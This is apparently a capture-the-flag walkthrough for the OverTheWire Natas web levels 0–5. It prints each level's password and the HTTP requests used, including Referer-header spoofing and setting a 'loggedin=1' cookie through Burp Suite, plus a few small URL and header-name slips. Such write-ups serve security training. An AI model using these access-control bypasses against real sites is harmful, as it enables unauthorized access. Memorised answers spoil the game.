# Natas game modules 0-5

#### 1. **Natas0 \[natas0:natas0\]**

     URL:[http://natas0.natas.labs.overthewire.org/](http://natas1.natas.labs.overthewire.org/)

Navigate to URL using the credentials renders a web page. Looking at the page source show the following code which contains password for Natas1.

`<html>
`

`<head>
`

`<!-- This stuff in the header has nothing to do with the level -->
`

`<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
`

`<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
`

`<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
`

`<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
`

`<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
`

`<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
`

`<script>var wechallinfo = { "level": "natas0", "pass": "natas0" };</script></head>
`

`<body>
`

`<h1>natas0</h1>
`

`<div id="content">
`

`You can find the password for the next level on this page.
`

`
`

**`<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
`**

`</div>
`

`</body>
`

`</html>`

---

#### 2. Natas1 \[natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto\]

URL:[http://natas1.natas.labs.overthewire.org/](http://natas1.natas.labs.overthewire.org/)

Navigating the URL show the page as below:

But we can see the page source from proxy tool like Burp Suite which shows the password for Natas2 as below:

`<h1>natas1</h1>`

`<div id="content">`

`You can find the password for the`

`next level on this page, but rightclicking has been blocked!`

`<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->`

`</div>`

`</body>`

`</html>`

---

#### 3. Natas2 \[natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi\]

URL:[http://natas2.natas.labs.overthewire.org/](http://natas2.natas.labs.overthewire.org/)

The page source shows the directory named as 'files'. Navigating the files folder shows the file with name 'users.txt'. Clicking on the users file reveals the password for Natas3.

http://natas2.natas.labs.overthewire.org/files/users.txt

`# username:password 
`

`alice:BYNdCesZqW 
`

`bob:jw2ueICLvT 
`

`charlie:G5vCxkVV3m 
`

**`natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`**` 
`

`eve:zo4mJWyNj2 
`

`mallory:9urtcpzBmH `

---

#### 4. Natas3 \[natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14\]

URL: http://natas3.natas.labs.overthewire.org/

Navigating to URL show the page source as below. 

&lt;h1&gt;natas3&lt;/h1&gt;

&lt;div id="content"&gt;

There is nothing on this page

&lt;!-- No more information leaks!! Not even Google will find it this time... --&gt;

&lt;/div&gt;

&lt;/body&gt;&lt;/html&gt;

Based on the hint 'Not even Google will find it this time', searched for natas3 in google reveals the folder 's3cr3t' as below:

Navigating to new folder shows the file 'users.txt' which inturn reveals the password for natas4 as below: http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt

**`natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`**

---

#### 5. Natas4 \[natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ\]

URL: [http://natas4.natas.labs.overthewire.org/](http://natas4.natas.labs.overthewire.org/)

Navigating to URL shows the web page as below:

Based on the hint shown on the page 'while authorized users should come only from "[http://natas4.natas.labs.overthewire.org/](http://natas4.natas.labs.overthewire.org/)"',  added referer header through Burp Suite proxy as below:

`GET / HTTP/1.1
`

`Host: natas4.natas.labs.overthewire.org
`

`User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
`

`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
`

`Accept-Language: en-US,en;q=0.5
`

`Cookie: __cfduid=d7ce1c5bbe6df2931caac6d36bf060f851513884420; __utma=176859643.1738819372.1513884442.1513884442.1513884442.1; __utmb=176859643.3.10.1513884442; __utmc=176859643; __utmz=176859643.1513884442.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)
`

**`Referrer: http://natas5.natas.labs.overthewire.org/
`**

`Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
`

`Connection: close
`

`Upgrade-Insecure-Requests: 1
`

`Cache-Control: max-age=0`

Then web page shows the password for natas5 as below:

---

#### 6. Natas5 \[natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq\]

URL: [http://natas5.natas.labs.overthewire.org/](http://natas5.natas.labs.overthewire.org/)

Navigating to URL shows the page as below.

Based on the message shown on the web page, looking at response headers shows that a cookie 'loggedin' is set to value 0. Refresh the page and change the value of cookie value as 'loggedin=1' shows the page with password for natas6.

`GET / HTTP/1.1`

`Host: natas5.natas.labs.overthewire.org`

`User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0`

`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`

`Accept-Language: en-US,en;q=0.5`

`Cookie: __cfduid=d7ce1c5bbe6df2931caac6d36bf060f851513884420; __utma=176859643.1738819372.1513884442.1513884442.1513884442.1; __utmc=176859643; __utmz=176859643.1513884442.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); loggedin=1`

`Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx`

`Connection: close`

`Upgrade-Insecure-Requests: 1`

`Cache-Control: max-age=0`

`natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

